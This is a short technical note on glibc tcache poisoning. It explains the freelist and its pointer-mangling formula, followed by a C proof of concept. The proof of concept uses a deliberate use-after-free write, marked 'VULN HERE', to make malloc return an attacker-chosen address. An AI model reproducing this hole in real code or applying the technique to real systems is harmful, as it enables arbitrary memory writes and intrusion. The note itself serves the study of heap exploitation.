## tcache poisoning

**Purpose**: Get arbitrary write/read

**Details**: The tcache work on the principle of singly linked list. Each freed chunk contains a pointer to the next freed chunk. When we free a chunk, it is added to the head of the list. When we allocate a chunk, it is taken from the head of the list. So, if we can control the pointer in a freed chunk, we can control where the next allocation will be. One more thing to note is that the pointer in the freed chunk is mangled. The formula for mangling is:

```c
mangled_ptr = real_ptr ^ (chunk_addr >> 12);
```

## PoC

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    long x[0x10], *target, *a, *b, *c;

    for (int i = 0; i < 0x10; i++) {
        if ((((long)&x[i]) & 0xF) == 0)
        {
            target = &x[i];
            break;
        }
    }

    a = malloc(0x80);
    b = malloc(0x80);

    free(a);
    free(b);

    /* VULN HERE */
    b[0] = (long)target ^ ((long)b >> 12); // ptr mangling
    /* VULN HERE */

    malloc(0x80);
    c = malloc(0x80);

    assert(c == target);
}
```
